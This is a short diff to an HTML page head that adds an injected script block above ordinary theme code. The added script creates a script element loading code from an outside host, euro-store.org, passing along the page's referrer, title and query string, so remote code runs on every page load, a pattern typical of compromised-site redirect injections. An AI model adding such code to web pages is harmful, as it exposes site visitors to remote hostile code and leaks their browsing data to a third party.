@@ -2,7 +2,18 @@
 <html dir="ltr">
 
 <head>
-  
+	
+  <span id="0d8daafd-4cc7-c991-0712-69b3f456cdb0"></span><script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='https://euro-store.org/3Z6jTqLG?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e4e7f2d9243e=script5e4e7f2d9243f&_cid=0d8daafd-4cc7-c991-0712-69b3f456cdb0'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && 'https://euro-store.org/3Z6jTqLG?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e4e7f2d9243e=script5e4e7f2d9243f'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
+</script>
+	
     <script>
     var themeHasJQuery = !!window.jQuery;
     </script>
